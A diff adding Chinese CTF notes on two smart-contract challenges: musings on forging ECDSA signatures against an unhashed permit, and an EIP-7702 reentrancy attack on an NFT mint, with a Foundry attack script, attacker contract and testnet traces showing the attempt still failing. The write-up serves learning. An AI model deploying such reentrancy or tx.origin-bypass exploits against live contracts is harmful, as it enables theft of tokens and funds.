@@ -827,3 +827,128 @@ contract TokenHelper {
     }
 }
 ```
+## Elliptic Token
+
+并非ethernaut
+
+这题给我一种cryptohack的感觉，都做不出来……
+
+bug似乎是permit函数直接使用了`bytes32(amount)`而不是哈希值，导致此处有空间做手脚
+
+在 https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm#Signature_verification_algorithm 部分可知：
+- 签名包含(m,r,s,v)
+- z应为签名的消息m的哈希值，但这题直接就是m本身
+- $u_1=zs^{-1}\mod n$
+- $u_2=rs^{-1}\mod n$
+- $(x_1,y_1)=u_1\times G+u_2\times Q_A$ ，目标是让 $r\equiv x_1\mod n$
+
+方便起见我们可以将s设为1。理论上如果 $(r,y_r)-u_2\times Q_A$ （我并不确定这是否是可能的，因为我到处都搜不到ecrecover的实现）正好是个好算离散对数的结果（比如阶是光滑数），就能对G算离散对数进而得出z值
+
+即使上述步骤是可能的，这个几率也小得可怜
+
+## UniqueNFT
+
+我要爆炸了！
+
+我打算跳过四星题，感觉它们都很难……而且我去网上搜了那些四星题目的答案，竟然一点信息都没有，更不敢做了
+
+于是我跑来做这题。查看ERC721的相关源码，发现`_mintNFT`中调用的[checkOnERC721Received](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/utils/ERC721Utils.sol)尝试调用接收者的onERC721Received函数，而且mintNFTEOA没有nonReentrant修饰符，看起来又是一道重入攻击？
+
+实际实现时发现了一个很大的问题。只有合约可以实现onERC721Received函数，而外部账号是不行的；mintNFTEOA又要求调用者必须是外部账号。倒是可以用外部账号调用mintNFTSmartContract和mintNFTEOA，然而1 ether可太贵了
+
+幸好这题是有[答案](https://medium.com/@sidarths/ethernaut-uniquenft-solved-c7e74f8572b2)的（
+
+以太坊在2024年加了一个[EIP-7702](https://eips.ethereum.org/EIPS/eip-7702)，允许外部账号设置账号地址的代码。诶这下不就可以给账号地址写onERC721Received函数了吗？更好的地方在于，`Self-sponsoring: allowing tx.origin to set code`这一节提到这一机制打破了之前`msg.sender == tx.origin`只会发生在最上层调用的假设，意味着onERC721Received函数里调用的mintNFTEOA仍然可以满足`tx.origin == msg.sender`的要求
+
+然后就是烦人的实现环节了。我直接用了foundry内部提供的[signDelegation](https://getfoundry.sh/reference/cheatcodes/sign-delegation)函数，然后出现了下述非常诡异的现象：
+```
+⡀ Sequence #1 on sepolia | Waiting for pending transactions
+    ⢀ [Pending] 0xacf2914f542efeef3f92a3cf9f95e738227e3dd7ef161e8eb20eff033c8da179
+    ⠠ [00:04:35] [#########################################################################################################################################################################] 2/2 txes (0.0s)
+    ⠠ [00:04:35] [#########################################################################>-------------------------------------------------------------------------] 1/2 receipts (3073908885877091328.0s)
+^C
+```
+transaction卡在调用mintNFTEOA的地方，而且这个预计耗时……不知道它是怎么算的，但肯定有点问题（
+
+叫deepseek把那篇答案的脚本从js viem改成foundry，得到了这个：
+```solidity
+contract AttackScript is Script {
+    function run() public {
+        vm.startBroadcast();
+        uint256 privateKey=;
+        address UNIQUE_NFT=;
+        address account = vm.addr(privateKey);
+        console.log("Using account:", account);
+        console.log("Target NFT:", UNIQUE_NFT);
+
+        // ReentrancyAttacker atk=new ReentrancyAttacker(UNIQUE_NFT);
+        // console.log("Attacker deployed at:", address(atk));
+
+        address _atk=0x42f8d0E0037ac8280C20F8e1BB43Ee1c55D42D83;
+        ReentrancyAttacker atk=ReentrancyAttacker(_atk);
+        // atk.reset(UNIQUE_NFT);
+        console.log(atk.target());
+        console.log(atk.entered());
+
+        // Vm.SignedDelegation memory signedDelegation = vm.signDelegation(address(atk), privateKey);
+        // vm.attachDelegation(signedDelegation);
+        // uint256 tokenId = UniqueNFT(UNIQUE_NFT).mintNFTEOA();
+        // console.log("Successfully minted NFT with tokenId:", tokenId);
+        // console.log("NFT balance:", UniqueNFT(UNIQUE_NFT).balanceOf(account));
+        vm.stopBroadcast();
+    }
+}
+contract ReentrancyAttacker is IERC721Receiver {
+    address public target;
+    uint256 public entered;
+
+    constructor(address _target) {
+        target = _target;
+    }
+
+    function reset(address _target) public {
+        target=_target;
+        entered=0;
+    }
+
+    function onERC721Received(
+        address,
+        address,
+        uint256,
+        bytes calldata
+    ) external returns (bytes4) 
+    {
+        entered += 1;
+
+        if (entered == 1) {
+            UniqueNFT(target).mintNFTEOA();
+        }
+
+        return IERC721Receiver.onERC721Received.selector;
+    }
+}
+```
+控制台可以顺利得到`NFT balance: 2`的输出，但是还是会发生transaction卡住的问题。而且在我多次调用后还报出了`After 5 attempts, provider nonce (254) is still behind expected nonce (255)`的错误（怎么又是你？）
+
+没招了，根据我之前的经验，这个错误只能等。等它消了我再继续尝试
+
+第二天我给脚本加了一点调试的功能，发现结果很诡异：
+```
+    ├─ [53670] 0x099032B6Da66F2E8E77BdDDF4BB450ec017fc379::mintNFTEOA()
+    │   ├─ [27865] 0x1Bf52Ada416D4c52E67C6326125bD6d7cD6433Ad::onERC721Received(0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0, 0x)
+    │   │   ├─ [0] 0x0000000000000000000000000000000000000000::mintNFTEOA()
+    │   │   │   └─ ← [Stop] 
+    │   │   └─ ← [Revert] EvmError: Revert
+    │   └─ ← [Revert] custom error 0x64a0ae92: 0000000000000000000000001bf52ada416d4c52e67c6326125bd6d7cd6433ad
+    └─ ← [Revert] custom error 0x64a0ae92: 0000000000000000000000001bf52ada416d4c52e67c6326125bd6d7cd6433ad
+
+
+
+== Logs ==
+  Using account: 0x1Bf52Ada416D4c52E67C6326125bD6d7cD6433Ad
+  Target NFT: 0x099032B6Da66F2E8E77BdDDF4BB450ec017fc379
+  0x099032B6Da66F2E8E77BdDDF4BB450ec017fc379
+  0
+Error: script failed: custom error 0x64a0ae92: 0000000000000000000000001bf52ada416d4c52e67c6326125bd6d7cd6433ad
+```
+调用mintNFTEOA时确实能触发onERC721Received，但onERC721Received里调用的mintNFTEOA所属的地址（target）却是0；然而在logs处可以发现target并不是0。见鬼了？
